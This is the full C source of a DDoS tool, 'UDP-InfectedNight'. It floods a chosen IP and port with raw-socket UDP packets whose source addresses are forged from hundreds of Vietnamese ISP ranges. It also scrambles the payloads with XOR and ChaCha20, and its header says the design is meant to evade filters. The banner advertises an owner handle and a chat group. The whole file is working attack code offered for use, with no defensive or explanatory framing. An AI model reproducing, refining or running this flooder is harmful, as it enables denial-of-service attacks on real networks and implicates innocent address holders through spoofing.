/*
 * High-performance UDP flooder with spoofed source IP and encrypted payload.
 * Uses raw sockets and multi-threading.
 * Payload is obfuscated with XOR and encrypted using ChaCha20 (via OpenSSL).
 * Designed to bypass filters by spoofing IP from Vietnamese ISP ranges.
 */

/*
 * gcc -O3 -o udp-infectednight udp-infectednight.c -lpthread -lssl -lcrypto
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#define MIN_PACKET      64          // Minimum payload size
#define MAX_PACKET      512         // Maximum payload size
#define WORKERS         1           // Number of threads
#define CACHE           1000        // Cache size for IP/payload reuse
#define CACHE_REFRESH   10000       // Number of sends before refreshing cache entry

// Danh sách đầy đủ các dải IPv4 của các nhà mạng Việt Nam
static const char *ranges[] = {
    // VNIX
    "218.100.14.0/24", "218.100.10.0/24", "218.100.60.0/24",
    
    // CMC Tl
    "103.252.0.0/22", "115.146.120.0/21", "115.165.160.0/21",
    "119.82.128.0/20", "202.134.16.0/21", "203.171.16.0/20",
    "103.21.148.0/22", "124.158.0.0/20", "101.99.0.0/18",
    "103.9.196.0/22", "113.20.96.0/19", "183.91.0.0/19",
    "203.205.0.0/18", "45.122.232.0/22",
    
    // DCNET
    "103.216.72.0/22",
    
    // FPT
    "1.52.0.0/14", "103.35.64.0/22", "103.39.92.0/22",
    "113.22.0.0/16", "113.23.0.0/17", "118.68.0.0/14",
    "144.48.20.0/22", "183.80.0.0/16", "183.81.0.0/17",
    "203.191.8.0/21", "210.245.0.0/17", "42.112.0.0/13",
    "43.239.148.0/22", "58.186.0.0/15",
    
    // GDS
    "113.52.32.0/19", "49.246.128.0/18", "49.246.192.0/19",
    
    // HTC-ITC
    "103.238.68.0/22", "203.128.240.0/21", "103.238.72.0/22",
    "202.60.104.0/21",
    
    // LCS
    "101.96.12.0/22", "113.61.108.0/22",
    
    // MBG
    "111.91.232.0/22", "103.19.164.0/22", "45.125.208.0/22",
    
    // MOBIFONE
    "103.53.252.0/22", "45.121.24.0/22",
    
    // MTT
    "103.235.208.0/22", "112.109.88.0/21", "182.237.20.0/22",
    
    // NetNam
    "119.17.192.0/19", "202.151.160.0/21", "210.86.224.0/21",
    "101.53.0.0/18", "119.15.176.0/20", "119.17.224.0/19",
    "202.151.168.0/21", "210.86.232.0/21", "101.96.64.0/18",
    "119.15.160.0/20",
    
    // ODS
    "103.249.100.0/22", "112.78.0.0/20", "125.253.112.0/20",
    "45.117.164.0/22",
    
    // SCTV
    "112.197.0.0/16", "27.2.0.0/15",
    
    // SPT
    "103.200.60.0/22", "116.118.0.0/17", "180.93.0.0/16",
    "203.196.24.0/22", "221.121.0.0/18", "221.133.0.0/19",
    
    // TPCOM
    "103.141.176.0/23", "103.205.96.0/22", "61.14.236.0/22",
    
    // VIETTEL
    "103.84.76.0/22", "115.72.0.0/13", "117.0.0.0/13",
    "125.234.0.0/15", "171.224.0.0/11", "203.113.128.0/18",
    "220.231.64.0/18", "27.64.0.0/12", "116.96.0.0/12",
    "125.212.128.0/17", "125.214.0.0/18", "203.190.160.0/20",
    
    // VNPT
    "203.162.0.0/16", "203.210.128.0/17", "221.132.0.0/18",
    "113.160.0.0/11", "123.16.0.0/12", "203.160.0.0/23",
    "222.252.0.0/14", "14.160.0.0/11", "14.224.0.0/11",
    "221.132.30.0/23", "221.132.32.0/21",
    
    // VNTT
    "103.17.88.0/22", "180.148.0.0/21", "45.118.136.0/22",
    
    // VTC
    "117.103.192.0/18",
    
    // VTVCab
    "103.233.48.0/22", "45.124.88.0/22",
    
    // VinaData
    "103.196.236.0/22", "45.127.252.0/22", "61.28.224.0/19",
    
    // Các thành viên khác và khách hàng
    "103.109.40.0/22", "103.237.96.0/22", "202.4.168.0/24",
    "103.1.200.0/22", "103.7.36.0/22", "103.10.44.0/22",
    "103.15.48.0/22", "103.17.236.0/22", "103.18.176.0/22",
    "103.20.144.0/22", "103.23.144.0/22", "103.28.36.0/22",
    "103.28.136.0/22", "103.28.172.0/22", "103.30.36.0/22",
    "103.31.120.0/22", "103.31.124.0/22", "103.37.28.0/22",
    "103.37.32.0/22", "103.38.136.0/22", "103.42.56.0/22",
    "103.45.228.0/22", "103.45.236.0/22", "103.47.192.0/22",
    "103.48.76.0/22", "103.48.80.0/22", "103.48.188.0/22",
    "103.48.192.0/22", "103.52.92.0/22", "103.53.88.0/22",
    "103.53.168.0/22", "103.53.228.0/22", "103.53.252.0/22",
    "103.54.248.0/22", "103.56.156.0/22", "103.56.160.0/22",
    "103.56.164.0/22", "103.57.104.0/22", "103.57.112.0/22",
    "103.57.208.0/22", "103.57.220.0/22", "103.60.16.0/22",
    "103.61.48.0/22", "103.62.8.0/22", "103.63.104.0/22",
    "103.63.108.0/22", "103.63.112.0/22", "103.63.116.0/22",
    "103.63.120.0/22", "103.63.212.0/22", "103.68.68.0/22",
    "103.68.72.0/22", "103.68.76.0/22", "103.68.80.0/22",
    "103.68.240.0/22", "103.68.244.0/22", "103.68.248.0/22",
    "103.68.252.0/22", "103.69.192.0/22", "103.70.28.0/22",
    "103.74.100.0/22", "103.74.112.0/22", "103.74.116.0/22",
    "103.74.120.0/22", "103.75.176.0/22", "103.75.180.0/22",
    "103.75.184.0/22", "103.77.160.0/22", "103.77.164.0/22",
    "103.77.168.0/22", "103.78.84.0/22", "103.79.140.0/22",
    "103.79.144.0/22", "103.81.80.0/22", "103.81.84.0/22",
    "103.82.20.0/22", "103.82.24.0/22", "103.82.28.0/22",
    "103.82.32.0/22", "103.82.36.0/22", "103.88.108.0/22",
    "103.88.112.0/22", "103.88.116.0/22", "103.88.120.0/22",
    "103.89.84.0/22", "103.89.88.0/22", "103.89.120.0/22",
    "103.90.220.0/22", "103.90.224.0/22", "103.90.228.0/22",
    "103.90.232.0/22", "103.92.16.0/22", "103.92.24.0/22",
    "103.92.28.0/22", "103.92.32.0/22", "103.94.176.0/22",
    "103.95.168.0/22", "103.95.196.0/22", "103.97.124.0/22",
    "103.97.132.0/22", "103.98.148.0/22", "103.98.152.0/22",
    "103.98.160.0/22", "103.99.0.0/22", "103.99.228.0/22",
    "103.99.244.0/22", "103.99.252.0/22", "103.100.160.0/22",
    "103.100.228.0/22", "103.101.32.0/22", "103.101.76.0/22",
    "103.101.160.0/22", "103.102.20.0/22", "103.103.116.0/22",
    "103.104.24.0/22", "103.104.116.0/22", "103.104.120.0/22",
    "103.106.220.0/22", "103.106.224.0/22", "103.107.180.0/22",
    "103.107.200.0/22", "103.108.100.0/22", "103.108.132.0/22",
    "103.108.136.0/22", "103.109.28.0/22", "103.109.32.0/22",
    "103.109.36.0/22", "103.109.40.0/22", "103.110.84.0/22",
    "103.111.236.0/22", "103.111.244.0/22", "103.112.124.0/22",
    "103.113.80.0/22", "103.113.88.0/22", "103.114.104.0/22",
    "103.115.166.0/24", "103.116.100.0/22", "103.116.104.0/22",
    "103.117.240.0/22", "103.117.244.0/22", "103.119.84.0/22",
    "103.121.88.0/22", "103.124.56.0/22", "103.129.80.0/22",
    "103.129.84.0/22", "103.129.88.0/22", "103.129.188.0/22",
    "103.130.220.0/22", "103.131.72.0/22", "103.140.40.0/23",
    "103.192.236.0/22", "103.195.236.0/22", "103.195.240.0/22",
    "103.196.16.0/22", "103.196.244.0/22", "103.196.248.0/22",
    "103.199.4.0/22", "103.199.8.0/22", "103.199.12.0/22",
    "103.199.16.0/22", "103.199.20.0/22", "103.199.24.0/22",
    "103.199.28.0/22", "103.199.32.0/22", "103.199.36.0/22",
    "103.199.40.0/22", "103.199.44.0/22", "103.199.48.0/22",
    "103.199.52.0/22", "103.199.56.0/22", "103.199.60.0/22",
    "103.199.64.0/22", "103.199.68.0/22", "103.199.72.0/22",
    "103.199.76.0/22", "103.200.20.0/22", "103.200.120.0/22",
    "103.205.100.0/22", "103.205.104.0/22", "103.206.212.0/22",
    "103.206.216.0/22", "103.207.32.0/22", "103.207.36.0/22",
    "103.211.212.0/22", "103.213.122.0/22", "103.214.8.0/22",
    "103.216.120.0/22", "103.216.124.0/22", "103.216.128.0/22",
    "103.219.180.0/22", "103.220.68.0/22", "103.220.84.0/22",
    "103.221.86.0/24", "103.221.212.0/22", "103.221.220.0/22",
    "103.221.224.0/22", "103.221.228.0/22", "103.223.4.0/22",
    "103.225.236.0/22", "103.226.108.0/22", "103.226.248.0/22",
    "103.227.112.0/22", "103.227.216.0/22", "103.228.20.0/22",
    "103.229.192.0/22", "103.231.148.0/22", "103.232.52.0/22",
    "103.232.56.0/22", "103.232.60.0/22", "103.232.120.0/22",
    "103.233.48.0/22", "103.234.36.0/22", "103.235.212.0/22",
    "103.237.60.0/22", "103.237.64.0/22", "103.237.96.0/22",
    "103.237.144.0/22", "103.237.148.0/22", "103.238.76.0/22",
    "103.238.80.0/22", "103.238.208.0/22", "103.238.212.0/22",
    "103.239.32.0/22", "103.239.116.0/22", "103.239.120.0/22",
    "103.241.248.0/22", "103.242.52.0/22", "103.243.104.0/22",
    "103.243.216.0/22", "103.245.148.0/22", "103.245.248.0/22",
    "103.245.252.0/22", "103.248.160.0/22", "103.248.164.0/22",
    "103.249.100.0/22", "103.250.24.0/22", "103.253.88.0/22",
    "103.254.12.0/22", "103.254.16.0/22", "103.254.40.0/22",
    "103.254.216.0/22", "103.255.84.0/22", "103.255.236.0/22",
    "110.35.64.0/21", "110.35.72.0/21", "110.44.184.0/21",
    "111.65.240.0/20", "111.91.232.0/22", "112.72.64.0/18",
    "112.78.0.0/20", "112.109.88.0/21", "112.137.128.0/20",
    "112.197.0.0/16", "113.20.96.0/19", "113.22.0.0/16",
    "113.23.0.0/17", "113.52.32.0/19", "113.61.108.0/22",
    "113.160.0.0/11", "115.72.0.0/13", "115.84.176.0/21",
    "115.146.120.0/21", "115.165.160.0/21", "116.68.128.0/21",
    "116.96.0.0/12", "116.118.0.0/17", "116.193.64.0/20",
    "117.0.0.0/13", "117.103.192.0/18", "118.68.0.0/14",
    "118.102.0.0/21", "118.107.64.0/18", "119.15.160.0/20",
    "119.15.176.0/20", "119.17.192.0/19", "119.17.224.0/19",
    "119.18.128.0/20", "119.18.184.0/21", "119.82.128.0/20",
    "120.50.184.0/21", "120.72.80.0/21", "120.72.96.0/19",
    "120.138.64.0/20", "121.50.172.0/22", "122.102.112.0/22",
    "122.201.8.0/21", "123.16.0.0/12", "124.158.0.0/20",
    "125.212.128.0/17", "125.214.0.0/18", "125.234.0.0/15",
    "125.253.112.0/20", "137.59.24.0/22", "137.59.28.0/22",
    "137.59.32.0/22", "137.59.36.0/22", "137.59.40.0/22",
    "137.59.44.0/22", "137.59.104.0/22", "137.59.116.0/22",
    "144.48.20.0/22", "146.196.64.0/22", "150.95.16.0/22",
    "150.95.104.0/21", "150.95.112.0/20", "157.119.244.0/22",
    "157.119.248.0/22", "163.44.192.0/22", "163.44.200.0/24",
    "163.44.204.0/22", "171.224.0.0/11", "175.106.0.0/22",
    "180.93.0.0/16", "180.148.0.0/21", "180.148.128.0/20",
    "182.161.80.0/20", "182.236.112.0/22", "182.237.20.0/22",
    "183.80.0.0/16", "183.81.0.0/17", "183.90.160.0/21",
    "183.91.0.0/19", "183.91.160.0/19", "202.0.79.0/24",
    "202.4.168.0/24", "202.4.176.0/24", "202.6.2.0/24",
    "202.6.96.0/23", "202.9.79.0/24", "202.9.80.0/24",
    "202.9.84.0/24", "202.37.86.0/23", "202.43.108.0/22",
    "202.44.137.0/24", "202.52.39.0/24", "202.55.132.0/22",
    "202.58.245.0/24", "202.59.238.0/23", "202.59.252.0/23",
    "202.60.104.0/21", "202.74.56.0/24", "202.74.58.0/23",
    "202.78.224.0/21", "202.87.212.0/22", "202.94.88.0/23",
    "202.124.204.0/24", "202.130.36.0/23", "202.134.16.0/21",
    "202.134.54.0/24", "202.143.108.0/22", "202.151.160.0/21",
    "202.151.168.0/21", "202.160.124.0/23", "202.161.178.0/24",
    "202.172.4.0/23", "202.191.48.0/21", "202.191.56.0/22",
    "203.8.127.0/24", "203.34.144.0/24", "203.77.178.0/24",
    "203.79.28.0/24", "203.99.248.0/22", "203.113.128.0/18",
    "203.128.240.0/21", "203.160.0.0/23", "203.160.132.0/22",
    "203.161.178.0/24", "203.162.0.0/16", "203.167.12.0/22",
    "203.170.26.0/23", "203.171.16.0/20", "203.176.160.0/21",
    "203.189.28.0/22", "203.190.160.0/20", "203.191.8.0/21",
    "203.196.24.0/22", "203.201.56.0/22", "203.205.0.0/18",
    "203.210.128.0/17", "203.227.112.0/22", "203.255.84.0/22",
    "210.2.64.0/18", "210.86.224.0/21", "210.86.232.0/21",
    "210.211.96.0/19", "210.245.0.0/17", "218.100.10.0/24",
    "218.100.14.0/24", "218.100.60.0/24", "220.231.64.0/18",
    "221.121.0.0/18", "221.132.0.0/18", "221.132.30.0/23",
    "221.132.32.0/21", "221.133.0.0/19", "222.252.0.0/14",
    "223.27.104.0/21", "27.0.12.0/22", "27.0.240.0/22",
    "27.2.0.0/15", "27.64.0.0/12", "27.118.16.0/20",
    "42.112.0.0/13", "43.239.148.0/22", "43.239.188.0/22",
    "43.239.220.0/22", "43.239.224.0/22", "45.117.76.0/22",
    "45.117.80.0/22", "45.117.160.0/22", "45.117.164.0/22",
    "45.117.168.0/22", "45.117.172.0/22", "45.117.176.0/22",
    "45.118.136.0/22", "45.118.140.0/22", "45.118.144.0/22",
    "45.118.148.0/22", "45.119.76.0/22", "45.119.80.0/22",
    "45.119.108.0/22", "45.119.212.0/22", "45.119.216.0/22",
    "45.119.240.0/22", "45.120.228.0/22", "45.121.24.0/22",
    "45.121.152.0/22", "45.121.160.0/22", "45.122.220.0/22",
    "45.122.232.0/22", "45.122.236.0/22", "45.122.240.0/22",
    "45.122.244.0/22", "45.122.248.0/22", "45.122.252.0/22",
    "45.123.96.0/22", "45.124.84.0/22", "45.124.88.0/22",
    "45.124.92.0/22", "45.125.200.0/22", "45.125.204.0/22",
    "45.125.208.0/22", "45.125.236.0/22", "45.126.92.0/22",
    "45.126.96.0/22", "45.127.252.0/22", "45.251.112.0/22",
    "45.252.240.0/22", "45.252.244.0/22", "45.252.248.0/22",
    "45.254.32.0/22", "47.117.156.0/22", "49.156.52.0/22",
    "49.213.64.0/18", "49.246.128.0/18", "49.246.192.0/19",
    "58.84.0.0/22", "58.186.0.0/15", "59.153.216.0/22",
    "59.153.220.0/22", "59.153.224.0/22", "59.153.228.0/22",
    "59.153.232.0/22", "59.153.236.0/22", "59.153.240.0/22",
    "59.153.244.0/22", "59.153.248.0/22", "59.153.252.0/22",
    "61.14.232.0/22", "61.14.236.0/22", "61.28.224.0/19"
};

// Caches for spoofed IPs, ports, and encrypted payloads
static char *ip_cache[CACHE];
static uint16_t port_cache[CACHE];
static unsigned char *payload_cache[CACHE];
static int payload_sizes[CACHE];

// Global signal flag to gracefully exit
static volatile sig_atomic_t running = 1;

// Represents a parsed subnet from CIDR
struct subnet {
    uint32_t ip;
    uint32_t mask;
};

// Shared job configuration for threads
struct job {
    int sock;
    const char *target;
    int dport;
    pthread_mutex_t mutex;
    long index;
};

// Signal handler for graceful termination
void signal_handler(int sig) {
    running = 0;
}

// Parse CIDR string to subnet
struct subnet parse_cidr(const char *cidr) {
    char ip[16];
    int prefix;
    if (sscanf(cidr, "%15[^/]/%d", ip, &prefix) != 2) {
        fprintf(stderr, "Invalid CIDR: %s\n", cidr);
        exit(1);
    }
    struct subnet s = {
        .ip = ntohl(inet_addr(ip)),
        .mask = ~((1U << (32 - prefix)) - 1)
    };
    return s;
}

// Generate random IP address within one of the spoofed ranges
char *rand_ip(void) {
    // Chọn ngẫu nhiên một dải IP từ tất cả các dải có sẵn
    int range_count = sizeof(ranges) / sizeof(ranges[0]);
    struct subnet s = parse_cidr(ranges[rand() % range_count]);
    uint32_t ip = s.ip, mask = s.mask;

    // Tạo địa chỉ IP ngẫu nhiên trong dải đã chọn
    for (int i = 0; i < 4; i++) {
        int b = 3 - i;
        uint8_t ip_b = (ip >> (b * 8)) & 0xFF;
        uint8_t mask_b = (mask >> (b * 8)) & 0xFF;
        ip_b = (ip_b & mask_b) | (rand() % 256 & ~mask_b);
        ip = (ip & ~(0xFFU << (b * 8))) | ((uint32_t)ip_b << (b * 8));
    }

    // Chuyển đổi sang dạng chuỗi
    struct in_addr addr = { .s_addr = htonl(ip) };
    char *res = malloc(16);
    if (!res) return NULL;

    strcpy(res, inet_ntoa(addr));
    return res;
}

// XOR-based obfuscation layer
void xor_crypt(unsigned char *data, int len, uint32_t k16, uint32_t k32) {
    for (int i = 0; i < len - 1; i += 2) {
        uint16_t v = (data[i] << 8) | data[i + 1];
        data[i] = (v ^ k16) >> 8;
        data[i + 1] = v & 0xFF;
    }
    for (int i = 0; i < len - 3; i += 4) {
        uint32_t v = (data[i] << 24) | (data[i + 1] << 16) |
                     (data[i + 2] << 8) | data[i + 3];
        v ^= k32;
        data[i] = v >> 24;
        data[i + 1] = (v >> 16) & 0xFF;
        data[i + 2] = (v >> 8) & 0xFF;
        data[i + 3] = v & 0xFF;
    }
}

// Obfuscate payload with XOR and encrypt using ChaCha20
void obfuscate(unsigned char *data, int len) {
    uint32_t k16 = rand() % 65536;
    uint32_t k32 = ((uint32_t)rand() << 16) | rand();
    xor_crypt(data, len, k16, k32);

    unsigned char key[32], nonce[12];
    if (RAND_bytes(key, 32) != 1 || RAND_bytes(nonce, 12) != 1)
        return;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return;

    if (EVP_EncryptInit_ex(ctx, EVP_chacha20(), NULL, key, nonce) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    unsigned char *tmp = malloc(len);
    if (!tmp) {
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    memcpy(tmp, data, len);
    int outlen;
    if (EVP_EncryptUpdate(ctx, data, &outlen, tmp, len) != 1) {
        free(tmp);
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    free(tmp);
    EVP_CIPHER_CTX_free(ctx);
}

// Generate and encrypt payload
unsigned char *gen_payload(int *size) {
    *size = MIN_PACKET + rand() % (MAX_PACKET - MIN_PACKET);
    unsigned char *p = malloc(*size);
    if (!p) return NULL;

    p[0] = 0x12; p[1] = 0x34; p[2] = 0x56; p[3] = 0x78;
    for (int i = 4; i < *size; i++)
        p[i] = rand() % 256;

    obfuscate(p, *size);
    return p;
}

// Internet checksum for IP header
uint16_t csum(unsigned char *data, int len) {
    uint32_t sum = 0;
    for (int i = 0; i < len - 1; i += 2)
        sum += (data[i] << 8) | data[i + 1];
    if (len % 2)
        sum += data[len - 1] << 8;
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);
    return ~sum;
}

// Construct and send spoofed UDP packet
void send_packet(int sock, const char *src, const char *dst,
                 uint16_t sport, uint16_t dport,
                 unsigned char *payload, int psize) {
    struct in_addr saddr, daddr;
    if (!src || !dst || inet_pton(AF_INET, src, &saddr) != 1 ||
        inet_pton(AF_INET, dst, &daddr) != 1)
        return;

    unsigned char iph[20] = {0x45, 0, 0, 28 + psize, 0, 0, 0, 0, 0, IPPROTO_UDP};
    memcpy(iph + 12, &saddr, 4);
    memcpy(iph + 16, &daddr, 4);
    uint16_t ipc = csum(iph, 20);
    iph[10] = ipc >> 8;
    iph[11] = ipc & 0xFF;

    unsigned char udph[8] = {sport >> 8, sport & 0xFF,
                             dport >> 8, dport & 0xFF,
                             0, 8 + psize, 0, 0};

    unsigned char *pkt = malloc(28 + psize);
    if (!pkt) return;

    memcpy(pkt, iph, 20);
    memcpy(pkt + 20, udph, 8);
    memcpy(pkt + 28, payload, psize);

    struct sockaddr_in d = {
        .sin_family = AF_INET,
        .sin_port = htons(dport),
        .sin_addr = daddr
    };
    sendto(sock, pkt, 28 + psize, 0, (struct sockaddr *)&d, sizeof(d));
    free(pkt);
}

// Replace cache entry with new spoofed IP and payload
void refresh_cache(int idx) {
    free(ip_cache[idx]);
    free(payload_cache[idx]);
    ip_cache[idx] = rand_ip();
    if (!ip_cache[idx]) return;

    unsigned char *p = gen_payload(&payload_sizes[idx]);
    if (!p) {
        free(ip_cache[idx]);
        ip_cache[idx] = NULL;
        return;
    }

    port_cache[idx] = 1024 + rand() % (65535 - 1024);
    payload_cache[idx] = p;
}

// Initialize all cache entries
void init_cache(void) {
    for (int i = 0; i < CACHE; i++) {
        ip_cache[i] = rand_ip();
        if (!ip_cache[i]) continue;

        payload_cache[i] = gen_payload(&payload_sizes[i]);
        if (!payload_cache[i]) {
            free(ip_cache[i]);
            ip_cache[i] = NULL;
            continue;
        }

        port_cache[i] = 1024 + rand() % (65535 - 1024);
    }
}

// Thread function: repeatedly send spoofed packets
void *worker(void *arg) {
    struct job *j = arg;
    long refresh_count = 0;
    while (running) {
        long i;
        pthread_mutex_lock(&j->mutex);
        i = j->index++;
        pthread_mutex_unlock(&j->mutex);

        int idx = i % CACHE;
        if (ip_cache[idx] && payload_cache[idx])
            send_packet(j->sock, ip_cache[idx], j->target,
                        port_cache[idx], j->dport, payload_cache[idx], payload_sizes[idx]);

        if (++refresh_count >= CACHE_REFRESH) {
            pthread_mutex_lock(&j->mutex);
            refresh_cache(idx);
            pthread_mutex_unlock(&j->mutex);
            refresh_count = 0;
        }
    }
    return NULL;
}

// Create thread pool and begin flooding
void flood(int sock, const char *target, int dport) {
    pthread_t th[WORKERS];
    struct job j = {
        .sock = sock,
        .target = target,
        .dport = dport,
        .index = 0
    };

    if (pthread_mutex_init(&j.mutex, NULL) != 0) {
        fprintf(stderr, "Mutex init failed\n");
        return;
    }

    for (int i = 0; i < WORKERS; i++)
        pthread_create(&th[i], NULL, worker, &j);

    for (int i = 0; i < WORKERS; i++)
        pthread_join(th[i], NULL);

    pthread_mutex_destroy(&j.mutex);
}

// Entry point
int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, " Owner: InfectedNight\n Group Zalo: https://zalo.me/g/ymfggo942\n Usage: %s <IP> <PORT>\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);

    if (target_port < 1 || target_port > 65535) {
        fprintf(stderr, "Invalid port: %d\n", target_port);
        return 1;
    }

    printf(" Owner: InfectedNight\n Group Zalo: https://zalo.me/g/ymfggo942\n");
    printf(" Starting UDP-InfectedNight flood to %s:%d\n", target_ip, target_port);

    signal(SIGINT, signal_handler);
    srand(time(NULL));

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket failed");
        return 1;
    }

    init_cache();
    flood(sock, target_ip, target_port);

    for (int i = 0; i < CACHE; i++) {
        free(ip_cache[i]);
        free(payload_cache[i]);
    }

    close(sock);
    return 0;
}